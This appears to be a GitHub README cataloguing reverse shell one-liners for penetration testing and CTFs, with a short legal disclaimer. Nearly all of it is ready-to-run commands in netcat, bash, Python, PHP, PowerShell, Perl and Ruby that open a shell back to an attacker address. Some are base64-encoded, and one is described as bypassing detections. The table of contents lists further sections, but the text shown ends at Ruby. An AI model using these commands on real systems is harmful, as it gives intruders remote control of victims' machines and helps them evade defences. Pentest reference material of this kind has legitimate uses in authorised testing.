# reverse-shell-one-liners-dictionary
Over 50+ ready-to-use reverse shell commands for penetration testing, CTFs, and authorized security assessments. Includes netcat, bash, python, php, powershell, perl, ruby, telnet, socat, node.js, java, lua, golang, awk, and troubleshooting tips.

# Reverse Shell One-Liners

**A quick reference for spawning reverse shells on common platforms.**

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Use only on systems you own or have explicit permission to test. Unauthorized use is illegal. The author assumes no responsibility for misuse.

> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common reverse shells.

## 📖 Table of Contents

1. [Netcat](#1-netcat)
2. [Bash](#2-bash)
3. [Python](#3-python)
4. [PHP](#4-php)
5. [PowerShell](#5-powershell)
6. [Perl](#6-perl)
7. [Ruby](#7-ruby)
8. [Telnet](#8-telnet)
9. [Socat](#9-socat)
10. [Node.js](#10-nodejs)
11. [Java](#11-java)
12. [Lua](#12-lua)
13. [Golang](#13-golang)
14. [Awk](#14-awk)
15. [Troubleshooting](#15-troubleshooting)

[🔝 Back to Top](#top)

# 1. Netcat

| Type | Command |
|------|---------|
| **Linux (with -e)** | `nc -e /bin/sh 192.168.1.5 4444` |
| **Linux (without -e)** | `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc 192.168.1.5 4444 > /tmp/f` |
| **Linux (alternative)** | `nc -c /bin/sh 192.168.1.5 4444` |
| **Windows (with nc.exe)** | `nc.exe 192.168.1.5 4444 -e cmd.exe` |

[🔝 Back to Top](#top)

# 2. Bash

```bash
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```
- With exec
  ```bash
  exec 5<>/dev/tcp/192.168.1.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
  ```
- With base64 (to avoid bad characters)
  ```bash
  echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=" | base64 -d | bash
  ```
[🔝 Back to Top](#top)


# 3. Python
- Python 2
  ```bash
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- Python 3
  ```bash
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```
- Windows Python
  ```bash
  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe','/i']);"
  ```
[🔝 Back to Top](#top)



# 4. PHP
 ```bash
php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```

- For Windows
  ```bash
  php -r '$sock=fsockopen("192.168.1.5",4444);exec("cmd.exe /c <&3 >&3 2>&3");'
  ```
 [🔝 Back to Top](#top)



# 5. PowerShell

-  Standard (verbose)
  ```bash
  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
  ```

- One-liner with base64 (shorter, bypasses many detections)
  ```bash
  powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBiACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgAgAD0AIAAkAHMAYgAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGIAdAAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
  ```

[🔝 Back to Top](#top)



# 6. Perl
  ```bash
  perl -e 'use Socket;$i="192.168.1.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```
- For Windows
  ```bash
  perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
  ```

  [🔝 Back to Top](#top)
  

# 7. Ruby
 ```bash
ruby -rsocket -e 'c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```





  









  



